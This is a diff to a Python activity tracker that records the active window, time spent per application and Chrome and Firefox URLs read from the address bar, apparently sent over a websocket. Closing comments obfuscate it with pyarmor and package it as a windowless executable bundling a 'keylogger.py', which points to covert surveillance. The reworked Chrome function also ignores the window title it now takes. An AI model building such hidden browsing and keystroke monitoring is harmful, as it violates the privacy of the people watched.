@@ -50,27 +50,38 @@ async def connect_websocket():
             await asyncio.sleep(5)
 
 # Chrome URL extractor
-def get_chrome_urls():
+def get_chrome_url_by_title(current_window_title):
     urls = []
+    
     try:
+        # Get a list of all Chrome windows using the find_windows function
         chrome_windows = find_windows(title_re=".*Chrome.*")
+        
         if not chrome_windows:
-            logging.debug("No Chrome windows found.")
+            print("No Chrome windows found.")
             return []
 
         for hwnd in chrome_windows:
             try:
+                # Connect to the Chrome window using its handle
                 app = Application(backend="uia").connect(handle=hwnd)
+
+                # Attempt to find the URL bar in each window
                 win = app.window(handle=hwnd)
                 url_bar = win.child_window(title="Address and search bar", control_type="Edit")
                 url = url_bar.get_value()
+
                 if url:
                     urls.append(url)
             except Exception as e:
-                logging.error(f"Error retrieving Chrome URL from window (handle {hwnd}): {e}")
+                print(f"Error retrieving URL from window (handle {hwnd}): {e}")
+
     except Exception as e:
-        logging.error(f"Error connecting to Chrome: {e}")
+        print(f"Error connecting to Chrome: {e}")
+
     return urls
+
+
 
 # Firefox URL extractor
 def get_firefox_urls():
@@ -130,7 +141,7 @@ class WindowTracker:
 
         return None, None, None, None
 
-    async def get_browser_url(self, executable):
+    async def get_browser_url(self, executable, current_window_title):
         current_time = time.time()
         if executable in self.url_cache:
             cache_time, url = self.url_cache[executable]
@@ -139,7 +150,7 @@ class WindowTracker:
 
         url = None
         if executable.lower() == "chrome.exe":
-            urls = get_chrome_urls()
+            urls = get_chrome_url_by_title(current_window_title)
             url = urls[0] if urls else None
         elif executable.lower() == "firefox.exe":
             urls = get_firefox_urls()
@@ -229,7 +240,8 @@ async def main():
                     application_name, browser_name = extract_application_name(old_window, old_executable)
                     current_url = None
                     if is_browser(old_executable):
-                        current_url = await window_tracker.get_browser_url(old_executable)
+                        current_url = await window_tracker.get_browser_url(old_executable, old_window)
+
 
                     time_spent = (end_time - old_start).total_seconds()
 
@@ -267,3 +279,10 @@ if __name__ == "__main__":
         win32api.SetConsoleCtrlHandler(handle_windows_signal, True)
 
     asyncio.run(main())
+
+
+
+
+#pyarmor obfuscate --recursive --output dist/obf your_script.py
+
+#pyinstaller --onefile --windowed --add-data "keylogger.py;." your_script.py
